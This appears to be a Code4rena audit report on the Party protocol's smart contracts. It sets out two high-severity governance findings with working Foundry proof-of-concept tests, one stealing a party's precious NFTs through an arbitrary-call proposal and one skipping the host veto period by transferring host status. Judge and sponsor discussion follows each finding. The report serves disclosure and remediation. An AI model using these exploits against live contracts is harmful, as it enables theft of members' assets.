[H-01] The 51% majority can hijack the party’s precious tokens through an arbitrary call proposal if theAddPartyCardsAuthoritycontract is added as an authority in the party.
Submitted bysin1st3r__
Pre-requisite knowledge & an overview of the features in question
The [AddPartyCardsAuthority](https://github.com/code-423n4/2023-10-party/blob/main/contracts/authorities/AddPartyCardsAuthority.sol) contract:TheAddPartyCardsAuthoritycontract is a contract designed to be integrated into a Party and it has only one purpose - to mint new party governance NFT tokens for party members.The party has to add this contract as an authority before it can start minting new party governance NFT tokens for users.TheAddPartyCardsAuthoritycontract is deployed on the mainnet on address0xC534bb3640A66fAF5EAE8699FeCE511e1c331cADThe 51% Majority attack:The PartyDAO team has put a lot of safeguards on a type of proposal calledArbitraryCallsProposalto prevent the 51% majority of the party to steal the precious NFT tokens of the party through this type of proposal. For a precious NFT token to be transferred out of the party to any other entity through this proposal, the proposal needs to be unanimously voted (100% of party members have voted on that proposal).
Overview of the vulnerability
There is no check on theArbitraryCallsProposalcontract that prevents the calling of theAddPartyCardsAuthoritycontract. This allows the 51% majority, through an arbitrary call proposal, to hijack ALL of precious tokens of the party.
They can achieve this by going through the following steps:
Create anArbitraryCallsProposalto simply mint a governance NFT token for an arbitrary user with an astronomical voting power, which gives the arbitrary user an ability to pass and bypass the execution delay of any proposal.The newly-created arbitrary user will create anArbitraryCallsProposalwith multiple arbitrary calls with a goal of transferring all of the party precious tokens to themselves.The newly-created arbitrary user will then vote on theArbitraryCallsProposalproposal they just created.The proposal will pass and be marked as a unanimously voted proposal, allowing them to bypass all of the safeguards in place to prevent the hijacking of precious NFT tokens through a non-unanimously voted proposal.
Proof of concept
Add the following code to a file with a name of your liking with an extension of “.t.sol”.Add the created file to thetest/folderRun the following command:forge test --match-contract TestHijackPreciousTokens --match-test testHijackPreciousExploit -vv
// SPDX-License-Identifier: GPL-3.0pragmasolidity^0.8;import{Vm}from"forge-std/Test.sol";import{TestUtils}from"./TestUtils.sol";import{IERC721}from"../contracts/tokens/IERC721.sol";import{GlobalsAdmin}from"./TestUsers.sol";import{PartyFactory}from"../contracts/party/PartyFactory.sol";import{Globals}from"../contracts/globals/Globals.sol";import{Party}from"../contracts/party/Party.sol";import{ProposalExecutionEngine}from"../contracts/proposals/ProposalExecutionEngine.sol";import{IFractionalV1VaultFactory}from"../contracts/proposals/vendor/FractionalV1.sol";import{MockZoraReserveAuctionCoreEth}from"./proposals/MockZoraReserveAuctionCoreEth.sol";import{IReserveAuctionCoreEth}from"../contracts/vendor/markets/IReserveAuctionCoreEth.sol";import{PartyGovernance}from"../contracts/party/PartyGovernance.sol";import{ERC721Receiver}from"../contracts/tokens/ERC721Receiver.sol";import{MetadataRegistry}from"../contracts/renderers/MetadataRegistry.sol";import{TokenDistributor}from"../contracts/distribution/TokenDistributor.sol";import{OffChainSignatureValidator}from"../contracts/signature-validators/OffChainSignatureValidator.sol";import{ArbitraryCallsProposal}from"../contracts/proposals/ArbitraryCallsProposal.sol";import{IProposalExecutionEngine}from"../contracts/proposals/IProposalExecutionEngine.sol";import{AddPartyCardsAuthority}from"../contracts/authorities/AddPartyCardsAuthority.sol";import{DummyERC721}from"./DummyERC721.sol";import"../contracts/utils/LibRawResult.sol";import"forge-std/console.sol";/// @notice This contract provides a fully functioning party instance for testing.///     Run setup from inheriting contract.abstractcontractSetupPartyHelperisTestUtils,ERC721Receiver{boolprivateimmutable_isForked;GlobalsAdmininternalglobalsAdmin;Partyinternalparty;PartyinternalpartyImpl;Globalsinternalglobals;PartyFactoryinternalpartyFactory;TokenDistributorinternaltokenDistributor;ProposalExecutionEnginepe;AddPartyCardsAuthorityaddPartyCards;uint256partyTotalVotingPower;structPartyMembersVotingPowers{uint96User_John_Votes;uint96User_Danny_Votes;uint96User_Steve_Votes;uint96User_Adam_Votes;uint96User_Jack_Votes;uint96User_Josh_Votes;}/** -------------------------- Party Authority -------------------------- */// Test authority member with dummy randomly generated addressaddressinternalauthorityTestUser=vm.addr(1);/** -------------------------- Party Members -------------------------- */// Test members with dummy randomly generated addressesaddressinternaluser_john=vm.addr(2);addressinternaluser_danny=vm.addr(3);addressinternaluser_steve=vm.addr(4);// Voting power of each party memberuint96internaljohnVotes;uint96internaldannyVotes;uint96internalsteveVotes;/** -------------------------- Party Hosts -------------------------- */// Test hosts with dummy randomly generated addressesaddressinternalhost_adam=vm.addr(5);addressinternalhost_jack=vm.addr(6);addressinternalhost_josh=vm.addr(7);// Voting power of each party hostuint96internaladamVotes;uint96internaljackVotes;uint96internaljoshVotes;/** -------------------------- Party precious tokens -------------------------- */DummyERC721internalerc721PreciousToken=newDummyERC721();IERC721[]internalpreciousTokens=newIERC721[](2);uint256[]internalpreciousTokenIds=newuint256[](2);constructor(boolisForked) {_isForked=isForked;}functionCreateNewParty(PartyMembersVotingPowersmemoryvotingPowers,stringmemorypartyName,stringmemorypartySymbol,uint40voteDuration,uint40executionDelay,uint16passThresholdBps,boolallowArbCallsToSpendPartyEth,booldistributionsRequireVote)public{Party.PartyOptionsmemoryopts;adamVotes=votingPowers.User_Adam_Votes;jackVotes=votingPowers.User_Jack_Votes;joshVotes=votingPowers.User_Josh_Votes;johnVotes=votingPowers.User_John_Votes;dannyVotes=votingPowers.User_Danny_Votes;steveVotes=votingPowers.User_Steve_Votes;address[]memoryhosts=newaddress[](0);opts.name=partyName;opts.symbol=partySymbol;opts.governance.hosts=hosts;opts.governance.voteDuration=voteDuration;opts.governance.executionDelay=executionDelay;opts.governance.passThresholdBps=passThresholdBps;opts.proposalEngine.allowArbCallsToSpendPartyEth=allowArbCallsToSpendPartyEth;opts.proposalEngine.distributionsRequireVote=distributionsRequireVote;opts.governance.totalVotingPower=johnVotes+dannyVotes+steveVotes+adamVotes+joshVotes+jackVotes;partyTotalVotingPower=opts.governance.totalVotingPower;initialize(opts);}functioninitialize(Party.PartyOptionsmemoryopts)internalvirtual{globalsAdmin=newGlobalsAdmin();globals=globalsAdmin.globals();partyImpl=newParty(globals);addressglobalDaoWalletAddress=address(420);globalsAdmin.setGlobalDaoWallet(globalDaoWalletAddress);pe=newProposalExecutionEngine(globals,_isForked?IReserveAuctionCoreEth(0x5f7072E1fA7c01dfAc7Cf54289621AFAaD2184d0):newMockZoraReserveAuctionCoreEth(),_isForked?IFractionalV1VaultFactory(0x85Aa7f78BdB2DE8F3e0c0010d99AD5853fFcfC63):IFractionalV1VaultFactory(address(0)));globalsAdmin.setProposalEng(address(pe));partyFactory=newPartyFactory(globals);globalsAdmin.setGlobalPartyFactory(address(partyFactory));tokenDistributor=newTokenDistributor(globals,0);globalsAdmin.setTokenDistributor(address(tokenDistributor));address[]memoryregistrars=newaddress[](2);registrars[0] =address(this);registrars[1] =address(partyFactory);MetadataRegistrymetadataRegistry=newMetadataRegistry(globals,registrars);globalsAdmin.setMetadataRegistry(address(metadataRegistry));OffChainSignatureValidatoroffChainGlobalValidator=newOffChainSignatureValidator();globalsAdmin.setOffChainSignatureValidator(address(offChainGlobalValidator));addPartyCards=newAddPartyCardsAuthority();address[]memoryauthorities=newaddress[](1);authorities[0] =authorityTestUser;// Mint two precious tokensuint256firstPreciousTokenId=erc721PreciousToken.mint(address(this));// NFT ID 1uint256secondPreciousTokenId=erc721PreciousToken.mint(address(this));// NFT ID 2preciousTokens[0] =IERC721(address(erc721PreciousToken));preciousTokens[1] =IERC721(address(erc721PreciousToken));preciousTokenIds[0] =firstPreciousTokenId;preciousTokenIds[1] =secondPreciousTokenId;party=partyFactory.createParty(partyImpl,authorities,opts,preciousTokens,preciousTokenIds,0);// Approve the created party to spend the two precious tokens.erc721PreciousToken.transferFrom(address(this),address(party),firstPreciousTokenId);erc721PreciousToken.transferFrom(address(this),address(party),secondPreciousTokenId);vm.startPrank(authorityTestUser);// Give party members voting powersparty.mint(user_john,johnVotes,user_john);party.mint(user_danny,dannyVotes,user_danny);party.mint(user_steve,steveVotes,user_steve);// Give party members voting powersparty.mint(host_adam,adamVotes,host_adam);party.mint(host_jack,jackVotes,host_jack);party.mint(host_josh,joshVotes,host_josh);vm.stopPrank();vm.warp(block.timestamp+1);}}contractTestHijackPreciousTokensisSetupPartyHelper{constructor()SetupPartyHelper(false) {}/** ------ Create a new party ------ */functionsetUp()public{PartyMembersVotingPowersmemoryvotingPowers=PartyMembersVotingPowers({User_John_Votes:50ether,User_Danny_Votes:50ether,User_Steve_Votes:50ether,User_Adam_Votes:50ether,User_Jack_Votes:50ether,User_Josh_Votes:50ether});super.CreateNewParty(votingPowers,"TestParty","PRT",100,0,// setting the execution delay as zero for the poc5000,// 50% of members have to accept the proposal for it go throughtrue,true);// Add `AddPartyCardsAuthority` contract as an authorityvm.prank(address(party));party.addAuthority(address(addPartyCards));}functiontestHijackPreciousExploit()public{/** ----------------------- [STAGE 1] ----------------------- *//*** [Stage 1] of the exploit objectives:*  -  Through an arbitrary call (unanimous proposal),*      mint an arbitrary address`attacker`an astronomical voting power.*/addressattacker=vm.addr(48748743784378);ArbitraryCallsProposal.ArbitraryCall[]memorycalls=newArbitraryCallsProposal.ArbitraryCall[](1);address[]memorynewPartyMembers=newaddress[](1);uint96[]memorynewPartyMemberVotingPowers=newuint96[](1);address[]memoryinitialDelegates=newaddress[](1);newPartyMembers[0] =attacker;newPartyMemberVotingPowers[0] =7922816251426433759354395;initialDelegates[0] =address(0);/** ------------ Non-unanimous `ArbitraryCall` proposal ------------ */calls[0] =createArbitraryCall(address(addPartyCards),abi.encodeWithSelector(AddPartyCardsAuthority.addPartyCards.selector,newPartyMembers,newPartyMemberVotingPowers,initialDelegates));PartyGovernance.Proposalmemorytest_proposal=createArbitraryCallProposal(calls);vm.prank(user_john);uint256proposalId=party.propose(test_proposal,0);vm.prank(user_danny);party.accept(proposalId,0);vm.prank(user_steve);party.accept(proposalId,0);vm.prank(user_john);party.execute(proposalId,test_proposal,preciousTokens,preciousTokenIds,"","");vm.warp(block.timestamp+5);/** ----------------------- [STAGE 2] ----------------------- *//*** [Stage 2] of the exploit objectives:*  -  Hijack the two precious tokens of the party**  The attacker will simply create an`ArbitraryCall`proposal to transfer the two precious tokens to him*  Since the attacker was minted voting power equivalent to the total voting power,*      the proposal will be marked as unanimous, bypassing the execution delay and precious NFT safeguards.*/calls=newArbitraryCallsProposal.ArbitraryCall[](2);calls[0] =createArbitraryCall(address(preciousTokens[0]),abi.encodeWithSelector(IERC721.transferFrom.selector,address(party),address(attacker),preciousTokenIds[0]));calls[1] =createArbitraryCall(address(preciousTokens[1]),abi.encodeWithSelector(IERC721.transferFrom.selector,address(party),address(attacker),preciousTokenIds[1]));test_proposal=createArbitraryCallProposal(calls);// The proposal will pass, will be marked as unanimous and it'll be ready to execute.vm.startPrank(attacker);proposalId=party.propose(test_proposal,1);party.execute(proposalId,test_proposal,preciousTokens,preciousTokenIds,"","");vm.stopPrank();}structArbitraryCall{addresspayabletarget;uint256value;bytesdata;bytes32expectedResultHash;}functioncreateArbitraryCallProposal(ArbitraryCallsProposal.ArbitraryCall[]memorycalls)publicpurereturns(PartyGovernance.Proposalmemory) {returnPartyGovernance.Proposal({maxExecutableTime:uint40(999999999999),cancelDelay:10000,proposalData:abi.encodeWithSelector(bytes4(uint32(ProposalExecutionEngine.ProposalType.ArbitraryCalls)),calls)});}functioncreateArbitraryCall(addressarbitraryCallTarget,bytesmemorytargetData)privatepurereturns(ArbitraryCallsProposal.ArbitraryCallmemory){returnArbitraryCallsProposal.ArbitraryCall({target:payable(address(arbitraryCallTarget)),value:0,data:targetData,expectedResultHash:bytes32(0)});}}
Remediation
In the function_isCallAllowedinArbitraryCallsProposal, add a check to prevent an arbitrary call from calling the contractAddPartyCardsAuthority. Or add a check to prevent an arbitrary call with a function selector, equivalent to that of theaddPartyCardsfunction in theArbitraryPartyCardsAuthoritycontract, to be executed.
Assessed type
Token-Transfer
KingNFT (lookout) commented:
A maliciousAddPartyCardsAuthorityproposal could be rejected by hosts during theExecutionDelayphase - the likelihood of a success attack is not too high.M might be more appropriate.
0xble (Party) acknowledged and commented:
Valid, although likely will not fix, as we’ve been debating removing the precious mechanism in a subsequent release. In additional to what @KingNFT pointed out, members can also use rage quit to exit if enabled.
arr00 (Party) commented:
An additional detail to add is that parties utilizing precious tokens would set theirenableAddAuthorityflag tofalsewhich would disable adding authorities. Seehere.
gzeon (judge) decreased severity to Medium and commented:
While governance attacks are typically out-of-scope, this attack specifically bypasses the precious mechanism, which I believe will make it reasonable to consider this as a valid medium.
0xStalin (warden) commented:
I would like to  mention that I believe it’s unfair to treat this report as a medium when the PartyDAO team considers this vulnerability to be high/severe.In their bug bounty program tablethey specifically mention “bypass guardrails to transfer precious NFT from parties” to be a severe level vulnerabilityAdditionally, looking at one of the audit reports they received from a firm (https://github.com/PartyDAO/party-protocol/blob/main/audits/Party-Protocol-Macro-Audit.pdf), one of the high severity findings listed is similar to the bug in question, just a different way to bypass the precious NFT token guardrails (and it was acknowledged and fixed).It’s worth mentioning that they consider it a high severity vulnerability only if the majority is able to hijack the precious NFT tokens throughArbitraryCallsProposalonly and not any other type of proposal. This report clearly demonstrates the ability for an attacker to hijack the precious tokens throughArbitraryCallsProposal.
deth (warden) commented:
I would like to point out that a majority attack has been acknowledged in a previousc4 finding.Issue #124 was judged as invalid because it was reported in a previousc4 finding as well.
0xStalin (warden) commented:
@deth - The previous C4 finding is about how an attacker can (under some circumstances/conditions) execute a flash loan attack to get 51% voting power and (potentially) create proposals and get them to pass if no host has vetoed on them.The finding in question here, is discussing how the 51% majority is able to hijack precious NFT tokens through an arbitrary call proposal when the intended behavior is to be able to transfer the precious NFT tokens out of a party through an arbitrary call proposal ONLY IF the proposal was voted on by 100% of the party members and not just the majority. The PartyDAO team has put several safeguards to prevent the transfer of those precious tokens through an arbitrary call proposal if it has not been unanimously voted (unanimous vote== 100%of the party members voted on the proposal).The finding in question bypasses all those mitigations. I made the case why this is a high severity vulnerability not a medium one, in my previous comment.
deth (warden) commented:
@0xStalin - I agree that this report is nuanced, but isn’t Stage 1 of the issue a majority attack?The 51% majority can hijack precious tokens of a party through an arbitrary call proposal.The finding in question is discussing how the 51% majority is able to hijack precious NFTYou also state it passes all mitigations and safeguards, but theexecutionDelayof the Party is set to0in the PoC. TheexecutionDelayin itself is a safeguard.Quote from theprevious finding.The expectation is parties will have reasonable governance settings and active governance to veto malicious proposals to manage the risk of a majority attack and if they don’t (e.g. set an execution delay of0) it is a deliberate choice on their part rather than a vulnerability.Will this attack still work, ifexecutionDelay != 0, because it’s the hosts responsibility to veto these sorts of proposals and it’s their error ifexecutionDelayis set to0in the first place?
0xStalin (warden) commented:
@deth - So there are multiple things I need to point out in regards to the context of the bug in question.When I point out that it bypasses all mitigations and safeguards, I’m talking about the safeguards implemented in theArbitraryCallsProposalspecifically, theexecutionDelayis out of question and I’ll explain why in my next point. You can see the precious NFT safeguards implemented inArbitraryCallsProposallines 185-215 and lines 63-104.This begs the question: okay whyArbitraryCallsProposalspecifically is an issue? The majority can actually execute this attack by adding a new authority throughAddAuthorityProposaland hijack those tokens or they can hijack those through other proposals.The thing withArbitraryCallsProposal, specifically, is that it can execute any arbitrary logic and does NOT have defined actions and defined risk (I’m quoting the sponsor here). A single party member/attacker can very easily trick the majority into accepting this proposal and hijack those tokens, so it doesn’t even have to be the 51% majority trying to steal them.This was the sponsor’s response when asked why do they consider hijacking precious tokens through a unanimously votedArbitraryCallProposala vulnerability while the same can be achieved using other proposals:“It is more dangerous because it can execute any arbitrary logic whereas other proposals have defined actions and defined risk.”and that’s really why theexecutionDelayprotection is not so relevant here.
gzeon (judge) commented:
This is not a duplicate ofthis previous c4 finding.executionDelayis not relevant here, as it is relevant in the other issue where it prevents the same block execution with a flashloan. That issue also does NOT bypass precious mechanism.However, both contracts in question here ()AddPartyCardsAuthorityandArbitraryCallsProposal) are actuallyout-of-scopefor this audit. So despite this, it seems to be a valid bypass with sponsor acknowledgment, this would be considered as out-of-scope and you should report it toPartyDAO bug bounty programinstead.
0xStalin (warden) commented:
@gzeon - TheProposalExecutionEnginecontract implements theArbitraryCallsProposalcontract so theArbitraryCallsProposalcontract is in-scope as well as all the other contracts which theProposalExecutionEnginecontract extends, isn’t it?TheArbitraryCallsProposalis an abstract contract and is implemented by theProposalExecutionEnginewhich would make it an in-scope asset, isn’t it?Secondly, while theAddPartyCardsAuthorityis OOS, the issue does NOT exist in this contract in the first place. The issue exists inArbitraryCallsProposalcontract. It’s just that whenAddPartyCardsAuthorityis added to a party to extend the functionality, this becomes an issue and precious tokens can easily be hijacked.
gzeon (judge) commented:
Reviewing again, thanks for the correction.
gzeon (judge) increased severity to High and commented:
Agree to pump this to High after consideringPartyDAO bug bounty programand the fact that guardrail can be bypassed to steal tokens.

[H-02] Single host can unfairly skip veto period for proposal that does not have full host support
Submitted byMadalad, also found bysin1st3r__,adriro,Emmanuel,0xbepresent,evmboi32,Shaheen,3docSec, klau5 (1,2),ast3ros,pontifex,HChang26,bart1e,P12473, andrvierdiiev
After a proposal passes the vote threshold, there is a delay before it can be executed so that hosts get a chance tovetoit if they wish. If all hosts voting in favour of the proposal, then this veto period is skipped.
However, a single host can ensure the veto period is skipped even if no other hostsacceptthe proposal. The veto period is in place to prevent harmful/exploitative proposals from being executed, even if they are passed; therefore, a malicious/compromised host being able to skip the veto period can be seriously harmful to the protocol and its users. TheTornado Cash governance hackfrom May 2023 is a relevant example, during which the attacker was able to steal around$1 million worth of assets.
This attack has a very low cost and a very high potential impact. If a malicious proposal is crafted in the same way used by the Tornado Cash attacker using hiddenCREATE2andSELFDESTRUCToperations, then it is entirely feasible that it would meet the voting threshold, as many voters may not be savvy enough to spot the red flags.
Proof of Concept
PartyGovernance#abdicateHostis a function that allows a host to renounce their host privileges, and transfer them to another address.
File:contracts\party\PartyGovernance.sol457:/// @notice Transfer party host status to another.458:/// @param newPartyHost The address of the new host.459:functionabdicateHost(addressnewPartyHost)external{460:_assertHost();461:// 0 is a special case burn address.462:if(newPartyHost!=address(0)) {463:// Cannot transfer host status to an existing host.464:if(isHost[newPartyHost]) {465:revertInvalidNewHostError();466:             }467:isHost[newPartyHost] =true;468:         }else{469:// Burned the host status470:             --numHosts;471:         }472:isHost[msg.sender] =false;473:emitHostStatusTransferred(msg.sender,newPartyHost);474:     }
https://github.com/code-423n4/2023-10-party/blob/main/contracts/party/PartyGovernance.sol#L457
This can be done at any stage in the life cycle of a proposal. This means that a host canaccepta proposal, incrementing thenumHostsAcceptedvalue for that proposal, then transfer the host status to another wallet that they control (that has non-zero voting power) andacceptagain, incrementingnumHostsAcceptedfor a second time. This process can be repeated as many times as necessary untilnumHostsAcceptedis equal to the total number of hostsnumHosts. Once the proposal reaches the required vote threshold, the veto period will be skipped, despite only one host accepting.
The following foundry test shows the process described above. Copy and paste it into PartyGovernanceTest.t.sol to run.
functiontest_maliciousHost()public{// Create usersPartyParticipantalice=newPartyParticipant();PartyParticipantbob=newPartyParticipant();PartyParticipantchad=newPartyParticipant();PartyParticipantaliceAltWallet=newPartyParticipant();// Create partyuint16passThresholdBps=5100;(Partyparty,IERC721[]memorypreciousTokens,uint256[]memorypreciousTokenIds) =partyAdmin.createParty(partyImpl,PartyAdmin.PartyCreationMinimalOptions({host1:address(alice),host2:address(bob),passThresholdBps:passThresholdBps,totalVotingPower:151,preciousTokenAddress:address(toadz),preciousTokenId:1,rageQuitTimestamp:0,feeBps:0,feeRecipient:payable(0)}));// alice and bob are the only two hostsassert(party.isHost(address(alice)));assert(party.isHost(address(bob)));assert(!party.isHost(address(chad)));assert(!party.isHost(address(aliceAltWallet)));// mint governance NFTspartyAdmin.mintGovNft(party,address(alice),50,address(alice));partyAdmin.mintGovNft(party,address(bob),50,address(bob));partyAdmin.mintGovNft(party,address(chad),50,address(chad));partyAdmin.mintGovNft(party,address(aliceAltWallet),1,address(aliceAltWallet));// alice proposes a proposalPartyGovernance.Proposalmemoryp1=PartyGovernance.Proposal({maxExecutableTime:9999999999,proposalData:abi.encodePacked([0]),cancelDelay:uint40(1days)});vm.roll(block.number+1);uint256proposalId=alice.makeProposal(party,p1,0);// chad accepts, but bob (the other host) does notvm.roll(block.number+1);chad.vote(party,proposalId,0);// proposal meets vote threshold, but not all hosts have acceptedvm.roll(block.number+1);(PartyGovernance.ProposalStatusstatus,PartyGovernance.ProposalStateValuesmemoryvalues) =party.getProposalStateInfo(proposalId);assertEq(values.numHosts,2);assertEq(values.numHostsAccepted,1);assertEq(uint(status),uint(PartyGovernance.ProposalStatus.Passed));// not Ready => veto period has not been skipped// alice transfers host status to her other wallet addressvm.prank(address(alice));vm.roll(block.number+1);party.abdicateHost(address(aliceAltWallet));// alice accepts using her other walletvm.roll(block.number+1);aliceAltWallet.vote(party,proposalId,0);// veto is now skipped even though a host (bob) did not acceptvm.roll(block.number+1);(status,values) =party.getProposalStateInfo(proposalId);assertEq(values.numHosts,2);assertEq(values.numHostsAccepted,2);assertEq(uint(status),uint(PartyGovernance.ProposalStatus.Ready));// Ready for execution => veto period has now been skipped}
Recommended Mitigation Steps
Utilise snapshots for hosts in a similar way to howvotingPoweris currently handled, so thatacceptonly incrementsnumHostsAcceptedif the caller was a host atproposedTime - 1. This can be achieved under the current architecture in the following way:
Add a newboolmember to theVotingPowerSnapshotstruct namedisHost.MakeabdicateHostsave new snapshots to the_votingPowerSnapshotsByVotermapping with the updatedisHostvalues for the old and new hosts.Replace theisHost[msg.sender]check inacceptwith a snapshot check, similar to howgetVotingPowerAtis currently used.
Assessed type
Governance
gzeon (judge) commented:
Confirmed by sponsorhere.
Judging as high due to compromised governance.
0xble (Party) confirmed
Note: For full discussion, seehere.

